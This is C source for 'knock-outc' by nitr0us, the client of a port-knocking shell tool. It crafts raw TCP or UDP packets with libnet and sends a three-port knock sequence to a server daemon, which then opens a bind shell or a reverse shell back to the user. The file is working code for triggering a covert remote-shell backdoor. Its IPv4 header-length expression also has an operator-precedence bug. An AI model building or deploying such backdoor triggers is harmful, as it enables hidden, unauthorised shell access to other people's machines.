/*
 * Client
 * knock-outc
 *
 * by nitr0us
 *
 */

#include "knock-out.h"
#include <libnet.h>

libnet_t	*context;

int main(int argc, char **argv)
{
	config_t	config;
	struct hostent	*hostinfo;
	struct in_addr	ip;
	int		k;
	char		errbuf[LIBNET_ERRBUF_SIZE], *errptr = NULL;

	if(getuid() != (uid_t) 0){
		fprintf(stderr, "You must be root (uid=0)\n");
		exit(EXIT_FAILURE);
	}

	if(argc < 2){
		fprintf(stderr, "Usage: %s <knock-outd server IP>\n", *argv);
		exit(EXIT_FAILURE);
	}

	signal(SIGINT, sigint_handler);

	if((hostinfo = gethostbyname(argv[1])) == NULL){
		herror("gethostbyname()");
		exit(EXIT_FAILURE);
	}

	memcpy(&ip, hostinfo->h_addr, 4);

	printf("-=[---------------------------------------------]=-\n");
	printf("-=[-- knock-outc : Port-Knocking Shell Client --]=-\n");
	printf("-=[---------------------------------------------]=-\n");
	printf("-=[----------------=[ nitr0us ]=----------------]=-\n");
	printf("-=[---------------------------------------------]=-\n\n");

	debugprint("<===== CONFIG =====>\n");

	Parse_config(&config);

	debugprint("-=[ Configuration parsing [OK]\n\n");

	printf("-=[ The chosen shell spawning method is %s, hence:\n", config.method);

	if(stringcomp("bind", config.method))
		printf("-=[ You must manually connect to the port %d on %s after the port knocking\n\n", config.port, argv[1]);
	else {
		printf("-=[ Make sure you have the port %d listening in this box to receive a shell\n", config.port);
		printf("-=[ Press any key to continue...\n");

		getchar();
	}

	debugprint("<===== LIBNET =====>\n");

	for(k = 0; k < 3; k++){
		sleep(NSECS); // Sleeps NSECS between each port knock

		if((context = libnet_init(LIBNET_RAW4,\
						NULL,\
						errbuf)) == NULL){
			fprintf(stderr, "libnet_init(): %s\n", errbuf);
			goto finish;
		}

		debugprint("-=[ [Packet %d] libnet_init():\t\t[OK]\n", k + 1);

		if(stringcomp("tcp", config.proto)){
			if(libnet_build_tcp((u_int16_t) rand(),		/* src port */
						(u_int16_t) (k == 0 ? config.sec1 : k == 1 ? config.sec2 : config.sec3), /* dst port */
						(u_long) random(),	/* seq */
						(u_long) random(),	/* ack */
						FLAG_KNOCK_TCP,		/* flags */
						0xffff,			/* win */
						0,			/* checksum */
						0,			/* urg */
						LIBNET_TCP_H,		/* hdr size */
						NULL,			/* payload */
						0,			/* payload size */
						context,		/* libnet context */
						0) == -1){		/* libnet ptag */
				if((errptr = libnet_geterror(context)) != NULL)
					fprintf(stderr, "libnet_build_tcp(): %s\n", errptr);
				else
					fprintf(stderr, "Error: libnet_build_tcp()\n");
				goto finish;
			}

			debugprint("-=[ [Packet %d] libnet_build_tcp():\t[OK]\n", k + 1);
		} else { /* udp */
			if(libnet_build_udp((u_int16_t) rand(),		/* src port */
						(u_int16_t) (k == 0 ? config.sec1 : k == 1 ? config.sec2 : config.sec3), /* dst port */
						LIBNET_UDP_H,		/* hdr size */
						0,			/* checksum */
						NULL,			/* payload */
						0,			/* payload size */
						context,		/* libnet context */
						0) == -1){		/* libnet ptag */
				if((errptr = libnet_geterror(context)) != NULL)
					fprintf(stderr, "libnet_build_udp(): %s\n", errptr);
				else
					fprintf(stderr, "Error: libnet_build_udp()\n");
				goto finish;
			}

			debugprint("-=[ [Packet %d] libnet_build_udp():\t[OK]\n", k + 1);
		}

		if(libnet_build_ipv4(LIBNET_IPV4_H + stringcomp("tcp", config.proto) ? LIBNET_TCP_H : LIBNET_UDP_H, /* hdr size */
					0,				/* service type */
					0,				/* id */
					0,				/* fragmentation */
					0xff,				/* ttl */
					stringcomp("tcp", config.proto) ? IPPROTO_TCP : IPPROTO_UDP, /* next layer proto */
					0,				/* checksum */
					0,				/* src ip */
					(u_int32_t) ip.s_addr,		/* dst ip */
					NULL,				/* payload */
					0,				/* payload size */
					context,			/* libnet context */
					0) == -1){			/* libnet ptag */
			if((errptr = libnet_geterror(context)) != NULL)
				fprintf(stderr, "libnet_build_ipv4(): %s\n", errptr);
			else
				fprintf(stderr, "Error: libnet_build_ipv4()\n");

			goto finish;
		}

		debugprint("-=[ [Packet %d] libnet_build_ip():\t[OK]\n", k + 1);

		if(libnet_write(context) == -1){
			if((errptr = libnet_geterror(context)) != NULL)
				fprintf(stderr, "libnet_write(): %s\n", errptr);
			else
				fprintf(stderr, "Error: libnet_write()\n");

			goto finish;
		}

		debugprint("-=[ [Packet %d] libnet_write():\t\t[OK]\n", k + 1);

		libnet_destroy(context);
		debugprint("-=[ [Packet %d] libnet_destroy():\t[OK]\n", k + 1);

		debugprint("-=[ [Packet %d] Port %d knocked\t\t[OK]\n\n", k + 1, \
			k == 0 ? config.sec1 : k == 1 ? config.sec2 : config.sec3);
	}

	debugprint("-=[ Port knocking finished...\t\t[OK]\n");

	exit(EXIT_SUCCESS);

finish:
	libnet_destroy(context);
	exit(EXIT_FAILURE);
}

void sigint_handler(int signum)
{
	debugprint("\n-=[ Received signal [%d]: %s\n", signum, sys_siglist[signum]);
	debugprint("-=[ Exiting...\n");

	exit(EXIT_FAILURE);
}
